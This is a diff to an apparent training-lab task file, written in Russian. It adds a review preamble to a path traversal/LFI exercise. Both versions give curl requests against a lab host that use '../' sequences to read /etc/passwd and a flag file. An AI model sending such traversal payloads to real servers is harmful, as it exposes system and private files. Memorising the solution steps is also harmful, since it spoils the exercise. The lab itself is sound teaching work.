@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: path traversal / LFI\n\nЦель — `http://shop.lab.local/download?file=`. Приложение отдаёт файл по имени.\nИмя проверяется плохо — можно выйти за пределы каталога.\n\n1. Обычный файл: `curl -s -i 'http://shop.lab.local/download?file=report.pdf'`.\n2. Выход в корень: `curl -s 'http://shop.lab.local/download?file=../../../../etc/passwd'`.\n3. Рядом с каталогом приложения (на уровень выше) лежит `flag.txt`:\n\n   curl -s -G 'http://shop.lab.local/download' --data-urlencode 'file=../flag.txt'\n\n4. Запиши флаг в `found.txt` и набери `check`.\n"
+      "text": "# Практика: path traversal / LFI\n## Повторение (`web-architecture`)\n\nПрежде чем браться за «LFI и Path Traversal: чтение файлов и RCE», повтори приём из `web-architecture` — «Архитектура веб-приложений: клиент, сервер, БД, прокси». Из чего состоит современное веб-приложение, где живут данные и где возникает большинство уязвимостей.\nСначала маленький шаг тем же приёмом:\n\n    head -n 5 task.md\n\nЭто возвращает тебя в контекст предшествующего урока, и уже затем — собственно задача ниже.\n\n\nЦель — `http://shop.lab.local/download?file=`. Приложение отдаёт файл по имени.\nИмя проверяется плохо — можно выйти за пределы каталога.\n\n1. Обычный файл: `curl -s -i 'http://shop.lab.local/download?file=report.pdf'`.\n2. Выход в корень: `curl -s 'http://shop.lab.local/download?file=../../../../etc/passwd'`.\n3. Рядом с каталогом приложения (на уровень выше) лежит `flag.txt`:\n\n   curl -s -G 'http://shop.lab.local/download' --data-urlencode 'file=../flag.txt'\n\n4. Запиши флаг в `found.txt` и набери `check`.\n"
     }
   ],
   "tools": {
